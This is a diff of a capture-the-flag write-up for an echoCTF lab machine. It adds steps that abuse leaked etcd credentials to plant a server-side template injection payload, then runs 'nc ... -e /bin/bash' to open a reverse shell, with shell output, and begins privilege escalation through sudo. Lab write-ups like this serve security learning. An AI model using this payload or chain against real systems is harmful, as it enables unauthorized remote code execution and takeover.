@@ -38,6 +38,7 @@ PoC for this vulnerability can be found here: https://github.com/lucyxss/etcd-3.
 Testing to see if our instance is also vulnerable.
 ![Vuln PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/debug_poc_2379.png)
 
+## Exploitation
 Using this vulnerability we care able to view leaked credetials for authenticating to `etcd`.
 ![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/leaked_creds_from_etctd_vuln.png)
 
@@ -110,7 +111,35 @@ OK
 We reload the web app on port `1337` and bingo!!! <br>
 ![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)
 
-After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target.
-`<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
+After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target. <br>
+Payload: `<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
 
-To be able to obtain code execution we will have to write
+We will further leverage this to obtain a revervseshell using the payload above.
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>"
+OK
+```
+
+We can now start our listener and reload the webpage to get a connection.
+```
+mcsam@0x32:~/$ rlwrap nc -lnvp 8989
+Listening on 0.0.0.0 8989
+Connection received on 10.0.160.122 40418
+python3 -c "import pty;pty.spawn('/bin/bash')"
+nodejs@etceterad:/app$ id
+uid=1001(nodejs) gid=1001(nodejs) groups=1001(nodejs)
+nodejs@etceterad:/app$ 
+```
+
+## Privilege Escalation
+First thing we can do is to check our `sudo` privileges on the machine.
+```
+mcsam@0x32:~/$ sudo -l
+Matching Defaults entries for nodejs on etceterad:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nodejs may run the following commands on etceterad:
+    (ALL : ALL) NOPASSWD: /usr/local/sbin/fetch_keys
+```
+
